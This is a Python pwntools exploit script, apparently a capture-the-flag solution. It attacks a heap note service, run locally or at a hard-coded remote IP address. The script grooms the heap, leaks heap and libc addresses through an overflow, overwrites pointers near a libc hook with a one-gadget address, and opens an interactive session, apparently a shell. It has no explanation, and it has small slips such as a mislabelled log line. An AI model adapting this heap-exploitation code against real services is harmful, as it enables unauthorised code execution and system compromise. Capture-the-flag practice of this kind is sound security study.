#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
context.log_level = 'debug'
s       = lambda x                  :orda.send(str(x))
sa      = lambda x, y                 :orda.sendafter(str(x),str(y)) 
sl      = lambda x                   :orda.sendline(str(x)) 
sla     = lambda x, y                 :orda.sendlineafter(str(x), str(y)) 
r       = lambda numb=4096          :orda.recv(numb)
rc        = lambda                     :orda.recvall()
ru      = lambda x, drop=True          :orda.recvuntil(x, drop)
rr        = lambda x                    :orda.recvrepeat(x)
irt     = lambda                    :orda.interactive()
uu32    = lambda x   :u32(x.ljust(4, '\x00'))
uu64    = lambda x   :u64(x.ljust(8, '\x00'))
db        = lambda    :raw_input()
def getbase_b64(t):
    pid=proc.pidof(s)[0]
    pie_pwd ='/proc/'+str(pid)+'/maps'
    f_pie=open(pie_pwd)
    return f_pie.read()[:12]
if len(sys.argv) > 1:
    s = "122.112.225.164:10001"
    host = s.split(":")[0]
    port = int(s.split(":")[1])
    orda = remote(host,port)
else:
    orda = process("./chall")

def add(size,content):
    sla(">>> ",'opcode:1\npasswd:Cr4at33\n\r\r')
    sla(">>> ",str(size))
    sa(">>> ",content)

def show(idx):
    sla(">>> ",'opcode:2\npasswd:SH0w3\n\r\r')
    sla(">>> ",str(idx))


def dele(idx):
    sla(">>> ",'opcode:4\npasswd:D3l4te3\n\r\r')
    sla(">>> ",str(idx))


def edit(idx,content):
    sla(">>> ",'opcode:3\npasswd:Ed1t3\n\r\r')
    sla(">>> ",str(idx))
    sa(">>> ",content)


add(0x208,"a"*0x200)#0
add(0x208,"b"*0x200)#1
add(0x208,'c'*0x200)#2
add(0x208,'a'*0x200)#3
for i in range(12):#12
    add(0x208,'a'*0x200)
for i in range(11,1,-1):#
    dele(i)

add(0x208,'k'*0x208)
show(0)
r(0x208)
heap_base = uu64(r(6))
log.info("heap_base :"+hex(heap_base))
edit(0,'c'*0x208+p64(heap_base-0x860+1+0x20))
show(1)

libc_addr = (uu64(r(5))<<8)+0xa0
log.info("heap_base :"+hex(libc_addr))
libc_base = libc_addr - 0x3ebca0
log.info("libc_base :"+hex(libc_base))
edit(0,'a'*0x208+p64(libc_base+0x3ebc30-4-8))
edit(1,'\x00'*4+p64(0x4f432+libc_base)+p64(libc_base+0x98d70+0x9))
log.info("one :"+hex(0x4f432+libc_base))
raw_input()
sla(">>> ",'opcode:1\npasswd:Cr4at33\n\r\r')
irt()
